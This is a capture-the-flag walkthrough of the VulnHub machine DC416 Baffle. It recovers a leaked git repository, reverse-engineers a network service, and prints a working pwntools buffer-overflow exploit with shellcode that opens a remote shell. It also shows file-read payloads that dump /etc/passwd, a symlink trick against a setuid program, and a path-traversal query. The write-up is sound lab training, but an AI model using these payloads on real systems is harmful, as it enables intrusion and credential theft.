# DC416-Baffle
[Link to vulnhub](https://www.vulnhub.com/entry/dc416-2016,168/)

## Reconnaissance
I start with reconnaissance to find the target because it has been set to receive DHCP
```
nmap -sS -O 192.168.159.0/24
```
I found the target at **192.168.159.133**. Now I start enumerate services running on that host.

## Enumeration
```
root@BOEING# nmap -A -T4 -p- 192.168.159.133

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-03-04 09:18 PST
Nmap scan report for 192.168.159.133
Host is up (0.00057s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 34:b3:3e:f7:50:91:51:6f:0b:e2:35:7b:d1:34:a1:eb (DSA)
|   2048 b9:a9:a8:bc:db:7d:77:e4:ae:31:1c:16:4f:3b:8b:de (RSA)
|_  256 88:3f:60:bb:9e:49:53:e3:f7:bb:30:84:7f:a8:f0:17 (ECDSA)
80/tcp   open  http     nginx 1.6.2
| http-git: 
|   192.168.159.133:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Trashed my code, but deployed the product anyway. 
|_http-server-header: nginx/1.6.2
|_http-title: baffle
6969/tcp open  acmsoda?
MAC Address: 00:0C:29:3A:D1:1A (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.57 ms 192.168.159.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds
```

From the result of Nmap, I found that the target was running 3 services
* SSH running on TCP port 22
* HTTP running on TCP port 80
* acmsoda (what is this service?) running on TCP port 6969

### Engagement Rules
First of all, I checked for a simple page /index.html on 192.168.159.133 then I found the instruction of this machine.
```
DC416 : baffle
Engagement Rules:

* No username/password bruteforcing is necessary
* This box has 5 flags
* Flags are in FLAG{} format
* The goal is not to get root. Get the flags and move on
* Have fun
```

I found git repository was stored on **/.git/**, I checked for this first. But even /.git existed I still could not clone this repository.
```
root@BOEING# git clone http://192.168.159.133/.git
Cloning into '192.168.159.133'...
fatal: repository 'http://192.168.159.133/.git/' not found
```

I used **wget -r http://<i></i>192.168.159.133/.git/** to recursive download all page on /.git
```
root@BOEING# ls -al
total 56
drwxr-xr-x  8 root root 4096 Mar  4 09:26 .
drwxr-xr-x  3 root root 4096 Mar  4 09:26 ..
drwxr-xr-x  2 root root 4096 Mar  4 09:26 branches
-rw-r--r--  1 root root   50 Oct 17 11:58 COMMIT_EDITMSG
-rw-r--r--  1 root root   92 Oct 17 11:12 config
-rw-r--r--  1 root root   73 Oct 17 11:12 description
-rw-r--r--  1 root root   23 Oct 17 11:12 HEAD
drwxr-xr-x  2 root root 4096 Mar  4 09:26 hooks
-rw-r--r--  1 root root  112 Oct 17 11:57 index
-rw-r--r--  1 root root 1394 Mar  4 09:26 index.html
drwxr-xr-x  2 root root 4096 Mar  4 09:26 info
drwxr-xr-x  3 root root 4096 Mar  4 09:26 logs
drwxr-xr-x 22 root root 4096 Mar  4 09:26 objects
drwxr-xr-x  4 root root 4096 Mar  4 09:26 refs
```

Checked for git's log by using command **git log** on dowloaded /.git directory.
```
root@BOEING# git log
commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:58:02 2016 -0400

    Trashed my code, but deployed the product anyway.

commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:55:07 2016 -0400

    Some assembly required

commit 9b5c226d15d611d6957f3fda7c993186270a6cc4
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:52:40 2016 -0400

    Made it into a write-type-thing instead

commit 06483346fab91b2b17471074a887ac7dffd9ceda
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:44:25 2016 -0400

    My cat danced on the keyboard

commit 7edc47a1c3e4dc880a7191915bdbf1565c6b7441
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:37:14 2016 -0400

    This coder turned coffee into code. You won't believe how she did it!

commit d7a1f067a2f4ac469bc4cf77c689a34e2286b665
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:30:20 2016 -0400

    Hello, friend...
```

I clone git from local downloaded page.
```
root@BOEING# pwd
/kapi/vulnhub/dc416-baffle/192.168.159.133/.git
root@BOEING# cd ..
root@BOEING# ls -al
total 64
drwxr-xr-x 3 root root  4096 Mar  4 09:26 .
drwxr-xr-x 3 root root  4096 Mar  4 09:26 ..
drwxr-xr-x 8 root root  4096 Mar  4 09:26 .git
-rw-r--r-- 1 root root   570 Oct 20 14:33 index.html
-rw-r--r-- 1 root root 44867 Mar 21  2015 logo.png
-rw-r--r-- 1 root root   256 Oct 20 14:36 styles.css
root@BOEING# git clone .git baffle_git
Cloning into 'baffle_git'...
done.
```

Now I saw hellofriend.c
```
root@BOEING# cd baffle_git/
root@BOEING# ls -al
total 16
drwxr-xr-x 3 root root 4096 Mar  4 09:33 .
drwxr-xr-x 4 root root 4096 Mar  4 09:33 ..
drwxr-xr-x 8 root root 4096 Mar  4 09:33 .git
-rw-r--r-- 1 root root  616 Mar  4 09:33 hellofriend.c
```

Check it out.
```
root@BOEING# cat hellofriend.c 
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char to_write[500]; 

int parse_request(char *req, int n) {
    char data[500]; 
    char file[500]; 
    char file_content[500]; 
    int file_len; 
    int req_type; 
    char mode[10];
    char *ptr = req; 
    FILE *fp;

    if (req_type == 0x01) {
        /* todo */
    }
    if (req_type == 0x2) {
        /* todo */
    }
    return 0; 
}

int main(int argc, char *argv[]) {
    char buf[2000];
    int n; 

    setbuf(stdout, 0); 

    memset(buf, 0, sizeof(buf)); 
    n = read(0, buf, sizeof(buf)); 
    parse_request(buf, n);

    return 0; 
}
```

To see complete git log of each commit use: **git log -p**

When I checked for all commits I found the commit **06483346fab91b2b17471074a887ac7dffd9ceda** has abnormal character case.
Including of the comment of commit **My cat danced on the keyboard**.

I checked out commit 06483346fab91b2b17471074a887ac7dffd9ceda
```
root@BOEING# git checkout 06483346fab91b2b17471074a887ac7dffd9ceda
root@BOEING# cat hellofriend.c 
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int parse_request(char *req, int n) {
    char file[500]; 
    char file_content[500]; 
    int file_len; 
    char *ptr = req; 
    FILE *fp;
    
    memset(file, 0, sizeof(file)); 

    ptr = (char *)ptr + 2;
    FiLe_len = n - 2 - 5 - 2; 
    memcpy(file, ptr, file_len); 

    fp = fopen(file, "r"); 
    if (fp) {
        memset(file_content, 0, sizeof(file_content)); 
        fgets(file_content, sizeof(file_content), fp); 
        printf("%s", file_content); 
    }
    return 0; 
}

int mAin(int arGc, char *argv[]) {
    char buf[2000];
    int n; 

    setbuf(stdout, 0); 

    memset(buf, 0, sizeof(buf)); 
    n = read(0, buf, sizeof(buf)); 
    p{ARSE_REQUEST}(buf, n);

    return 0; 
}
```

I check for only upper case of the file hellofriend.c
```
root@BOEING# grep -Eo "[A-Z]" hellofriend.c
FILEFLAGARSEREQUEST
```

I look like flag. I extracted it manually.
### 1st FLAG.
```
FLAG{ARSE_REQUEST}
```
When I check for the log, it was another file named project.enc in commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
```
root@BOEING# git checkout  d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
Note: checking out 'd38ce2e28e32aa7787d5e8a2cb83d3f75c988eca'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at d38ce2e... Some assembly required
root@BOEING# ls -al
total 28
drwxr-xr-x 3 root root  4096 Mar  4 17:08 .
drwxr-xr-x 4 root root  4096 Mar  4 17:01 ..
drwxr-xr-x 8 root root  4096 Mar  4 17:08 .git
-rw-r--r-- 1 root root   857 Mar  4 17:08 hellofriend.c
-rw-r--r-- 1 root root 11315 Mar  4 17:08 project.enc
```

It seemed base64 encodeing then tried to decode it.
```
root@BOEING# cat project.enc | base64 -d > project
root@BOEING# file project
project: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8d8f87535451003b05db15d14d07818576813b49, not stripped
```
It appeared to be 64-bit executable file but my Kali was **32-bit** so I changed to my 64-bit kali.
```
root@AIRBUS# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
HEAD is now at d38ce2e... Some assembly required
root@AIRBUS# cat project.enc | base64 -d > project
root@AIRBUS# file project
project: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8d8f87535451003b05db15d14d07818576813b49, not stripped
```

I checked for functions exists in the binary
```
root@AIRBUS:# gdb -q project
Reading symbols from project...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
gdb-peda$ disassemble main 
Dump of assembler code for function main:
   0x00000000004008f7 <+0>:     push   %rbp
   0x00000000004008f8 <+1>:     mov    %rsp,%rbp
   0x00000000004008fb <+4>:     sub    $0x7f0,%rsp
   0x0000000000400902 <+11>:    mov    %edi,-0x7e4(%rbp)
   0x0000000000400908 <+17>:    mov    %rsi,-0x7f0(%rbp)
   0x000000000040090f <+24>:    mov    0x2004aa(%rip),%rax        # 0x600dc0 <stdout@@GLIBC_2.2.5>
   0x0000000000400916 <+31>:    mov    $0x0,%esi
   0x000000000040091b <+36>:    mov    %rax,%rdi
   0x000000000040091e <+39>:    callq  0x4005c0 <setbuf@plt>
   0x0000000000400923 <+44>:    lea    -0x7e0(%rbp),%rax
   0x000000000040092a <+51>:    mov    $0x7d0,%edx
   0x000000000040092f <+56>:    mov    $0x0,%esi
   0x0000000000400934 <+61>:    mov    %rax,%rdi
   0x0000000000400937 <+64>:    callq  0x4005e0 <memset@plt>
   0x000000000040093c <+69>:    lea    -0x7e0(%rbp),%rax
   0x0000000000400943 <+76>:    mov    $0x7d0,%edx
   0x0000000000400948 <+81>:    mov    %rax,%rsi
   0x000000000040094b <+84>:    mov    $0x0,%edi
   0x0000000000400950 <+89>:    callq  0x4005f0 <read@plt>
   0x0000000000400955 <+94>:    mov    %eax,-0x4(%rbp)
   0x0000000000400958 <+97>:    mov    -0x4(%rbp),%edx
   0x000000000040095b <+100>:   lea    -0x7e0(%rbp),%rax
   0x0000000000400962 <+107>:   mov    %edx,%esi
   0x0000000000400964 <+109>:   mov    %rax,%rdi
***0x0000000000400967 <+112>:   callq  0x400746 <parse_request>
   0x000000000040096c <+117>:   mov    $0x0,%eax
   0x0000000000400971 <+122>:   leaveq 
   0x0000000000400972 <+123>:   retq   
End of assembler dump.
```
You will see the main function call a function named parse_request
```
gdb-peda$ disassemble parse_request 
Dump of assembler code for function parse_request:
   0x0000000000400746 <+0>:     push   %rbp
   0x0000000000400747 <+1>:     mov    %rsp,%rbp
   0x000000000040074a <+4>:     sub    $0x630,%rsp
   0x0000000000400751 <+11>:    mov    %rdi,-0x628(%rbp)
   0x0000000000400758 <+18>:    mov    %esi,-0x62c(%rbp)
   0x000000000040075e <+24>:    mov    -0x628(%rbp),%rax
   0x0000000000400765 <+31>:    mov    %rax,-0x8(%rbp)
   0x0000000000400769 <+35>:    lea    -0x410(%rbp),%rax
   0x0000000000400770 <+42>:    mov    $0x1f4,%edx
   0x0000000000400775 <+47>:    mov    $0x0,%esi
   0x000000000040077a <+52>:    mov    %rax,%rdi
   0x000000000040077d <+55>:    callq  0x4005e0 <memset@plt>
   0x0000000000400782 <+60>:    lea    -0x620(%rbp),%rax
   0x0000000000400789 <+67>:    mov    $0xa,%edx
   0x000000000040078e <+72>:    mov    $0x0,%esi
   0x0000000000400793 <+77>:    mov    %rax,%rdi
   0x0000000000400796 <+80>:    callq  0x4005e0 <memset@plt>
   0x000000000040079b <+85>:    mov    -0x628(%rbp),%rax
*1*0x00000000004007a2 <+92>:    add    $0x1,%rax
   0x00000000004007a6 <+96>:    movzbl (%rax),%eax
   0x00000000004007a9 <+99>:    movsbl %al,%eax
   0x00000000004007ac <+102>:   mov    %eax,-0xc(%rbp)
*2*0x00000000004007af <+105>:   cmpl   $0x1,-0xc(%rbp)
   0x00000000004007b3 <+109>:   jne    0x40084f <parse_request+265>
   0x00000000004007b9 <+115>:   addq   $0x2,-0x8(%rbp)
   0x00000000004007be <+120>:   mov    -0x62c(%rbp),%eax
   0x00000000004007c4 <+126>:   sub    $0x9,%eax
   0x00000000004007c7 <+129>:   mov    %eax,-0x10(%rbp)
   0x00000000004007ca <+132>:   mov    -0x10(%rbp),%eax
   0x00000000004007cd <+135>:   movslq %eax,%rdx
   0x00000000004007d0 <+138>:   mov    -0x8(%rbp),%rcx
   0x00000000004007d4 <+142>:   lea    -0x410(%rbp),%rax
   0x00000000004007db <+149>:   mov    %rcx,%rsi
   0x00000000004007de <+152>:   mov    %rax,%rdi
*3*0x00000000004007e1 <+155>:   callq  0x400620 <memcpy@plt>
   0x00000000004007e6 <+160>:   lea    -0x410(%rbp),%rax
   0x00000000004007ed <+167>:   mov    $0x400a04,%esi
   0x00000000004007f2 <+172>:   mov    %rax,%rdi
*4*0x00000000004007f5 <+175>:   callq  0x400630 <fopen@plt>
   0x00000000004007fa <+180>:   mov    %rax,-0x18(%rbp) 
   0x00000000004007fe <+184>:   cmpq   $0x0,-0x18(%rbp)
   0x0000000000400803 <+189>:   je     0x40084f <parse_request+265>
   0x0000000000400805 <+191>:   lea    -0x610(%rbp),%rax
   0x000000000040080c <+198>:   mov    $0x1f4,%edx
   0x0000000000400811 <+203>:   mov    $0x0,%esi
   0x0000000000400816 <+208>:   mov    %rax,%rdi
   0x0000000000400819 <+211>:   callq  0x4005e0 <memset@plt>
   0x000000000040081e <+216>:   mov    -0x18(%rbp),%rdx
   0x0000000000400822 <+220>:   lea    -0x610(%rbp),%rax
   0x0000000000400829 <+227>:   mov    $0x1f4,%esi
   0x000000000040082e <+232>:   mov    %rax,%rdi
   0x0000000000400831 <+235>:   callq  0x400610 <fgets@plt>
   0x0000000000400836 <+240>:   lea    -0x610(%rbp),%rax
   0x000000000040083d <+247>:   mov    %rax,%rsi
   0x0000000000400840 <+250>:   mov    $0x400a06,%edi
   0x0000000000400845 <+255>:   mov    $0x0,%eax
   0x000000000040084a <+260>:   callq  0x4005d0 <printf@plt>
*5*0x000000000040084f <+265>:   cmpl   $0x2,-0xc(%rbp)
   0x0000000000400853 <+269>:   jne    0x4008f0 <parse_request+426>
   0x0000000000400859 <+275>:   lea    -0x210(%rbp),%rax
   0x0000000000400860 <+282>:   mov    $0x1f4,%edx
   0x0000000000400865 <+287>:   mov    $0x0,%esi
   0x000000000040086a <+292>:   mov    %rax,%rdi
   0x000000000040086d <+295>:   callq  0x4005e0 <memset@plt>
   0x0000000000400872 <+300>:   mov    $0x1f4,%edx
   0x0000000000400877 <+305>:   mov    $0x0,%esi
   0x000000000040087c <+310>:   mov    $0x600de0,%edi
   0x0000000000400881 <+315>:   callq  0x4005e0 <memset@plt>
   0x0000000000400886 <+320>:   addq   $0x2,-0x8(%rbp)
   0x000000000040088b <+325>:   mov    -0x8(%rbp),%rax
   0x000000000040088f <+329>:   mov    %rax,%rdi
   0x0000000000400892 <+332>:   callq  0x4005b0 <strlen@plt>
   0x0000000000400897 <+337>:   mov    %eax,-0x10(%rbp)
   0x000000000040089a <+340>:   mov    -0x10(%rbp),%eax
   0x000000000040089d <+343>:   cltq   
   0x000000000040089f <+345>:   add    $0x1,%rax
   0x00000000004008a3 <+349>:   add    %rax,-0x8(%rbp)
   0x00000000004008a7 <+353>:   addq   $0x6,-0x8(%rbp)
   0x00000000004008ac <+358>:   mov    -0x8(%rbp),%rax
*6*0x00000000004008b0 <+362>:   mov    $0x600de0,%edx
   0x00000000004008b5 <+367>:   mov    $0x3e,%ecx
   0x00000000004008ba <+372>:   mov    %rdx,%rdi
   0x00000000004008bd <+375>:   mov    %rax,%rsi
   0x00000000004008c0 <+378>:   rep movsq %ds:(%rsi),%es:(%rdi)
   0x00000000004008c3 <+381>:   mov    %rsi,%rax
   0x00000000004008c6 <+384>:   mov    %rdi,%rdx
   0x00000000004008c9 <+387>:   mov    (%rax),%ecx
   0x00000000004008cb <+389>:   mov    %ecx,(%rdx)
   0x00000000004008cd <+391>:   lea    0x4(%rdx),%rdx
   0x00000000004008d1 <+395>:   lea    0x4(%rax),%rax
   0x00000000004008d5 <+399>:   mov    -0x8(%rbp),%rcx
   0x00000000004008d9 <+403>:   lea    -0x210(%rbp),%rax
*8*0x00000000004008e0 <+410>:   mov    $0x7d0,%edx
   0x00000000004008e5 <+415>:   mov    %rcx,%rsi
   0x00000000004008e8 <+418>:   mov    %rax,%rdi
   0x00000000004008eb <+421>:   callq  0x400620 <memcpy@plt>
   0x00000000004008f0 <+426>:   mov    $0x0,%eax
   0x00000000004008f5 <+431>:   leaveq 
   0x00000000004008f6 <+432>:   retq   
End of assembler dump.
```
The binary check if the input started with 0x1 and then read file that input provided the name. But instruction \*1\* it add 0x1 to rax that mean I have to add 0x1 twice and then follow with a file name then the binary will read the file for me.
```
root@AIRBUS:# cat flag.txt 
This_is_test_flag_from_Kapi
root@AIRBUS:# python -c'print "\x01\x01flag.txtijpqrs"' | ltrace ./project
__libc_start_main(0x4008f7, 1, 0x7ffc3a7d0958, 0x400980 <unfinished ...>
setbuf(0x7f9e32469620, 0)                                                                      = <void>
memset(0x7ffc3a7d0090, '\0', 2000)                                                             = 0x7ffc3a7d0090
read(0, "\001\001flag.txtijpqrs\n", 2000)                                                      = 17
memset(0x7ffc3a7cfc60, '\0', 500)                                                              = 0x7ffc3a7cfc60
memset(0x7ffc3a7cfa50, '\0', 10)                                                               = 0x7ffc3a7cfa50
memcpy(0x7ffc3a7cfc60, "flag.txt", 8)                                                          = 0x7ffc3a7cfc60
fopen("flag.txt", "r")                                                                         = 0x1b25010
memset(0x7ffc3a7cfa60, '\0', 500)                                                              = 0x7ffc3a7cfa60
fgets("This_is_test_flag_from_Kapi\n", 500, 0x1b25010)                                         = 0x7ffc3a7cfa60
printf("%s", "This_is_test_flag_from_Kapi\n"This_is_test_flag_from_Kapi
)                                                  = 28
+++ exited (status 0) +++
```
**File name must be followed by 6 any letters**

After review for a while I noticed that the service runnign on TCP port 6969 seem to be project binary.

I checked that if my thought was right.
```
root@AIRBUS# python -c'print "\x01\x01/etc/passwdijpqrs"' | nc 192.168.159.133 6969
root:x:0:0:root:/root:/bin/bash
```
Uhm... then I decided to exploited this service because it had vulnerable function **memcpy**

## Exploitation
Let check for ASLR if it was enabled. If ASLR was enabled it could protect me to exploit the binary.
```
root@AIRBUS# python -c'print "\x01\x01/proc/sys/kernel/randomize_va_spaceijpqrs"' | nc 192.168.159.133 6969
2
```
Not a good news because binary run in the target was protected by [Address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization). With another branch of the binary, if I provide 0x02 twice at payload header:
* <+265> Binary will check if first 2 bytes were 0x02 and 0x02.
* <+362> Binary prepare fix address **0x600de0** to store input string as buffer.
* <+410> Indicated the amount of bytes to be copied to buffer.

The idea is if I prepare shellcode in my payload and set first 2 bytes as 0x02 the binary will copy my shellcode to the fixed memory address at 0x600de0. Then I overflow return address with fixed 0x600de0 then the binary will execute my shellcode.
```python
from pwn import *
from struct import *

# msfvenom -p linux/x64/exec -v shell -f py CMD="/bin/bash"
shell =  ""
shell += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
shell += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
shell += "\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61"
shell += "\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05"

buf =  "\x02\x02\x00"
buf += "\x90" * 20
buf += shell
buf += "\x90"*(522-len(shell))
buf += pack("<Q", 0x600de0)

host = "192.168.159.133"
port = 6969

try:
    p = remote(host, port)
    p.sendline(buf)
    p.interactive()
except EOFError as e:
    log.error(e)
finally:
    with context.quiet:
        p.close()
```

Not surprise, I got a shell.
```
root@AIRBUS# python exploit_baffle_bufferOverflow.py 
$<5>[$<2>+] Opening connection to 192.168.159.133 on port 6969: Done
[$<2>*] Switching to interactive mode
$<2>$ $<5>id
$<5>uid=1001(alice) gid=1001(alice) groups=1001(alice)
$<2>$ $<2>
```
Flag was easy to find.
```
$<2>$ $<5>dir
$<5>bin   etc    initrd.img  lost+found    opt   run   sys  var
boot  flag.txt    lib        media    proc  sbin  tmp  vmlinuz
dev   home    lib64        mnt        root  srv   usr
$<2>$ $<5>cat flag.txt
$<5>FLAG{is_there_an_ivana_tinkle}
$<2>$ $<2>
```
### 2nd FLAG.
```
FLAG{is_there_an_ivana_tinkle}
```
## Find more flags
After traverse into the target I found
```
$<2>$ $<5>pwd
$<5>/home/bob/filez
$<2>$ $<5>ls -al
$<5>total 24
drwxr-xr-x 2 charlie charlie 4096 Oct 25 04:07 .
drwxr-xr-x 5 bob     bob     4096 Oct 25 04:21 ..
-r--r----- 1 charlie charlie   50 Oct 25 03:51 auth.txt
-r--r----- 1 charlie charlie   29 Oct 23 08:06 flag.txt
-rwsr-xr-x 1 charlie charlie 6856 Oct 25 03:45 flag_vault
$<2>$ $<5>./flag_vault
$<5>______ _                _    _   _             _ _   
|  ___| |            /\| |/\| | | |           | | |  
| |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_ 
|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_ 
\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
                __/ |                                
               |___/                                 
$<5>
ENTER YOUR AUTHENTICATION CODE: $<2>$ $<5>password
$<5>CHECKING CODE$<5>N$<5>
$<2>$ $<5>
```

It's luck, I found email from bob@baffle.me sent to alice
```
$<2>$ $<5>mail
$<5>Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/alice": 1 message 1 new
>N  1 bob@baffle.me      Thu Jan  2 11:38   21/559   Flag #2
$<2>$ $<5>cat /var/mail/alice
$<5>From bob@baffle.me  Thu Jan  2 11:38:22 2014
Return-Path: <root@baffle.me>
X-Original-To: alice
Delivered-To: alice@baffle.me
Received: by baffle.me (Postfix, from userid 0)
        id B612F2C0E36; Thu,  2 Jan 2014 11:38:22 -0800 (PST)
From: Bob <bob@baffle.me>
To: alice@baffle.me
Subject: Flag #2
Message-Id: <2014010204825.B612F2C0E36@baffle.me>
Date: Thu,  2 Jan 2014 11:38:22 -0800 (PST)
Status: O

Alice,

I need you to login to my account. My password is in /home/bob/flag.txt 
You'll need to authenticate to Flag Vault in order to get its contents. 

-- 
Bob
```
Alice was simply traverse to some directory in /home/bob and I found 3 files in /home/bob/filez
* auth.txt
* flag.txt
* flag_vault

I used symbolic link to link flag_vault to /home/alice and link flag.txt to /home/alice. If I execute flag_vault it read auth.txt which I will create a new one and check if input of flag_vault match to auth.txt
```
$<2>$ $<5>cd /home/alice/
$<2>$ $<5>echo test > auth.txt
$<2>$ $<5>ln -s /home/bob/filez/flag.txt /home/alice/flag.txt
$<2>$ $<5>ln -s /home/bob/filez/flag_vault /home/alice/flag_vault
$<2>$ $<5>./flag_vault
$<5>______ _                _    _   _             _ _   
|  ___| |            /\| |/\| | | |           | | |  
| |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_ 
|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_ 
\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
                __/ |                                
               |___/                                 
$<5>
ENTER YOUR AUTHENTICATION CODE: $<2>$ $<5>test
$<5>CHECKING CODE$<5>CODE IS V$<5>
DATA: FLAG{tr3each3ry_anD_cUnn1ng}
```
### 3rd FLAG.
```
FLAG{tr3each3ry_anD_cUnn1ng}
```
From email content stated that Bob's password was stored in /home/bob/flag.txt but in /home/bob there is no flag.txt but there was at /home/bob/filez/flag.txt. I tried to logon SSH with bob and tr3each3ry_anD_cUnn1ng.
```
root@AIRBUS:~# ssh bob@192.168.159.133
The authenticity of host '192.168.159.133 (192.168.159.133)' can't be established.
ECDSA key fingerprint is SHA256:bPqC4D9ISTLmkTkW1WlS5xley+Gspbd19CV0Sh8GnI8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.159.133' (ECDSA) to the list of known hosts.
bob@192.168.159.133's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar  6 02:33:07 2017 from 192.168.159.1
bob@baffle:~$ 
```
Uhm...I successful logged on to that host using bob:tr3each3ry_anD_cUnn1ng

I found a binary in /home/bob/binz/
```
bob@baffle:~/binz$ ls -al
total 20
drwxrwx--- 2 bob     vulnhub  4096 Oct 24 07:27 .
drwxr-xr-x 5 bob     bob      4096 Oct 25 04:21 ..
-rwxr-xr-x 1 vulnhub vulnhub 10936 Oct 24 07:26 ctfingerd
```
But when I execute it I found that the binary try to bind some port and it fail
```
bob@baffle:~/binz$ ./ctfingerd 
bind: Address already in use
```

I check for open port and found TCP 7979.
```
bob@baffle:~$ netstat -pant
(No info could be read for "-p": geteuid()=1002 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:6969            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:7979          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:56815         127.0.0.1:7979          FIN_WAIT2   -               
tcp        1      0 127.0.0.1:7979          127.0.0.1:56815         CLOSE_WAIT  -               
tcp        2      0 127.0.0.1:7979          127.0.0.1:56813         CLOSE_WAIT  -               
tcp        1      0 127.0.0.1:7979          127.0.0.1:56814         CLOSE_WAIT  -               
tcp        2      0 127.0.0.1:7979          127.0.0.1:56811         CLOSE_WAIT  -               
tcp        0    168 192.168.159.133:22      192.168.159.4:43110     ESTABLISHED -               
tcp        0      0 127.0.0.1:56814         127.0.0.1:7979          FIN_WAIT2   -               
tcp        0      0 192.168.159.133:6969    192.168.159.4:54446     ESTABLISHED -               
tcp        1      0 127.0.0.1:7979          127.0.0.1:56812         CLOSE_WAIT  -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -       
```

I use netcat to connect to localhost at TCP port 7979
```
bob@baffle:~/binz$ nc 127.0.0.1 7979
Socket fd: 9
User to query: root
Checking...
Don't know anything about this user.
---
bob
^C
bob@baffle:~/binz$ nc 127.0.0.1 7979
Socket fd: 10
User to query: bob
Checking...
Vulnerable by Design
---
^C
bob@baffle:~/binz$ nc 127.0.0.1 7979
Socket fd: 11
User to query: alice
Checking...
aGEgaGEgbWFkZSB5b3UgbG9vaw== >> decoded 'ha ha made you look'
---
^C
bob@baffle:~/binz$ nc 127.0.0.1 7979
Socket fd: 12
User to query: charlie
Checking...
I haz a flag mwahahaha
---
```

It seem this binary try to read file .plan of each users.
```
bob@baffle:~$ ls -al
total 40
drwxr-xr-x 5 bob     bob     4096 Oct 25 04:21 .
drwxr-xr-x 6 root    root    4096 Oct 20 03:38 ..
-rw------- 1 bob     bob      188 Oct 25 04:18 .bash_history
-rw-r--r-- 1 bob     bob      220 Oct 17 15:28 .bash_logout
-rw-r--r-- 1 bob     bob     3515 Oct 17 15:28 .bashrc
drwxrwx--- 2 bob     vulnhub 4096 Oct 24 07:27 binz
drwxr-xr-x 2 charlie charlie 4096 Oct 25 04:07 filez
-rw-r--r-- 1 bob     bob       21 Oct 25 04:11 .plan
-rw-r--r-- 1 bob     bob      675 Oct 17 15:28 .profile
drwx------ 2 root    root    4096 Oct 25 04:21 .ssh
bob@baffle:~$ pwd
/home/bob
bob@baffle:~$ cat .plan
Vulnerable by Design
bob@baffle:~$
```


It had permission to read file of all users so try to read charlie's flag.txt.
```
bob@baffle:~$ nc 127.0.0.1 7979
Socket fd: 31
User to query: /./././charlie/flag.txt
Checking...
FLAG{i_haz_sriracha_ice_cream}
```

### 4th FLAG.
```
FLAG{i_haz_sriracha_ice_cream}
```


### 5th FLAG.
```
In process
```

### For other information